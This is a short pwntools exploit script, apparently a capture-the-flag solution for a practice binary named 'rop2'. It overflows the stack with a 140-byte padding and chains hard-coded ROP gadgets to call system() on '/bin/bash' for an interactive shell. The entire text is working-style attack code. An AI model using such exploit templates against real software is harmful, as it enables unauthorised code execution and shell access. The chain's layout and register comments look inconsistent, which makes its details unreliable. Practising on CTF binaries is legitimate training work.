from pwn import *

# Path to the binary
binary_path = './pwn/stack/rop-2/rop2'

# Start process
p = process(binary_path)

# Load the ELF binary
elf = ELF(binary_path)

# Find the offset to the return address
offset = 140

# Gadgets found from ROPgadget
pop_ebx_ret = 0x08048364
pop_ebp_ret = 0x08048473
pop_all_ret = 0x0804859c

# Address of "/bin/bash" in the data section
bin_bash = next(elf.search(b'/bin/bash'))

# Address of system() in the PLT
system_plt = elf.plt['system']

# Build the ROP chain
payload = flat([
    b'A' * offset,                    # Padding to reach return address
    pop_all_ret,                     # Gadget to pop arguments into registers
    bin_bash,                        # Argument for system(): pointer to "/bin/bash"
    0xdeadbeef,                      # Pop into esi (not used)
    0xdeadbeef,                      # Pop into edi (not used)
    0xdeadbeef,                      # Pop into ebp (not used)
    system_plt                       # Call system()
])

# Send the payload
p.sendline(payload)

# Pass interaction back to user
p.interactive()
